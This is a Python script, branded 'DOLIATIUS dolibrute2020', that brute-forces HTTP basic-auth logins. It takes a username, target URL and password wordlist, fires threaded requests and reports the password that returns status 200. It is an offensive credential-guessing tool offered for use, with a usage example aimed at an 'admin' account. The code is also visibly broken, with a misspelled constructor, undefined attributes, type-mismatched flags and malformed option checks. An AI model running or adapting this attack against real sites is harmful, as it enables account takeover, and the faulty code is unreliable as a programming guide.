#! /usr/bin/env python
#! -*- coding: UTF-8 -*-

import requests
import sys
import getopt
from threading import Thread
from colorama import Fore, Style, init, Back

#Doliatius

global t
t=1

def banner():
	print(Fore.CYAN+Back.YELLOW+ "        ###################")
	print("        "+Fore.CYAN+Back.YELLOW+"#####"+Fore.BLACK+"DOLIATIUS"+Fore.CYAN+"#####")
	print("        ###"+Fore.RED+ "dolibrute2020"+Fore.CYAN+"###")
	print(Fore.CYAN+ "        ###################")
	
def help():
	print("             "+Fore.RED+Back.BLACK+"HOW TO USE:")
	print("        "+Fore.BLUE+Back.BLACK+"-u: Username")
	print("        "+Fore.BLUE+Back.BLACK+"-l: URL")
	print("        "+Fore.BLUE+Back.BLACK+"-w: Wordlist document")
	print("        "+Fore.BLUE+Back.BLACK+"-s: Number of tries")
	print("        "+Fore.BLUE+Back.BLACK+"Example: python dolibrute.py -u admin -l www.website.com -w list.txt -s 42069")
	
class request_start(Thread):
	def __init(self, password, user, url):
		Thread.__init__(self)
		self.passwordsplit=password.split("\n")[0]
		self.username=user
		self.url=url
		print("Password: "+self.passwd)
		
	def attack(self):
		global t
		if t=="1":
			try:
				re.requests.get(self.url, auth=(self.username, self.password))
				if re.status_code==200:
					t="0"
					print(Fore.GREEN+"Password is found: "+self.password)
					sys.exit()
				else:
					print(Fore.RED+ "Password is incorrect: "+self.password)
					doli[0]=doli[0]-1

			except (Exception, error):
				print(Fore.RED+ "ERROR: " +error)
				
def do_try(passwords, threads, user, url):
	global doli
	doli=[]
	doli.append(0)
	while len(passwords):
		if t=="1":
			try:
				if doli[0]<threads:
					password=passwords.pop(0)
					doli[0]=doli[0]+1
					thread=request_start(password, user, url)
					Thread.start()
			
			except KeyboardInterrupt:
				print(Back.YELLOW+ "Application is stopped")
				sys.exit()
			Thread.join()
			
def enter(argv):
	banner()
	if len(sys.argv)<5:
		help()
		sys.exit()
	
	try:
		opts, args=getopt.getopt(argv, "u:l:w:s:")
	except:
		print(Fore.RED+ "Errror! You have entered a wrong or uncomplete input")
		sys.exit()
	
	for opt,arg in opts:
		if opt=="-u":
			user=arg
		elif opt=="-l":
			url=arg
		elif opt=="w":
			wordlist=arg
		elif opt=="s":
			threads=arg
	
	try:
		wordl=open(wordlist, "r")
		passwords=(wordl.readlines())
		
	except:
		print(Fore.RED+"ERROR! Document is not found or you have entered incomplete input")
		sys.exit()
		
	do_try(passwords,threads,user,url)
	
if __name__=="__main__":
	try:
		enter(sys.argv[1:])
		
	except KeyboardInterrupt:
		print(Back.YELLOW+ "Application is closed")
		
